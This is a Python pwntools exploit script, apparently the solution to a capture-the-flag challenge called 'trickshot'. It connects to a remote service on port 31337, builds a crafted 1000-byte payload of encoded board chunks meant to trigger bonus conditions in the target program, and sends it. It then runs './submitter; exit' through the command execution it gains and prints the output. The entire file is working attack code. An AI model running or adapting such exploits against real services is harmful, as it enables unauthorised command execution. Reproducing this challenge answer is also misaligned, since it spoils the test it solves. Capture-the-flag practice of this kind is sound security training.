#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get("HOST", "localhost")
PORT = 31337

context.log_level = "debug"


def add(bz: bytes, val: int):
    return bytes([(x + val) % 256 for x in bz])


def where():
    return 10 * ((skip * pos + bounce + bias) % 100)


r = remote(HOST, int(PORT))
bias = 1
alignment_bonus_value = 0xAAAA0000

skip = 0
pos = 0
bounce = 0
# With bias = 1 first board chunk will be at offset 10
pd = {
    4: p16(bias),
    6: p32(alignment_bonus_value),
    # bounce = 0, trigger fuzz bonus; skip += 0, pos++
    10: b"\x04fUzZ\x00tHiS",
}
skip += 0
pos += 1
bounce += 1

# leet bonus
skip_add = 0
print(f"{where()=}")
assert where() not in pd
pd[where()] = add(b"\x40" + p16(skip_add) + b"?" + b"133777", bounce)
skip += skip_add
bounce += 1

print(f"{where()=}")
assert where() not in pd
skip_add = 0
pd[where()] = add(b"\x10\x55\x55\x55\x55\x55\x55\x55" + p16(skip_add), bounce)
skip += skip_add
pos += 2
bounce += 1

print(f"{where()=}")
pd[where()] = add(b"\x80" + p32(1) + p32(0xFFFFFFFF) + b"\x00", bounce)
skip += 0
pos += 4
bounce += 1

payload = flat(
    pd,
    length=1000,
    filler=b"\xff",
)
r.sendafter(b"trickshot...\n", payload)
time.sleep(1)
r.sendline("./submitter; exit")
print(r.recvall().decode())
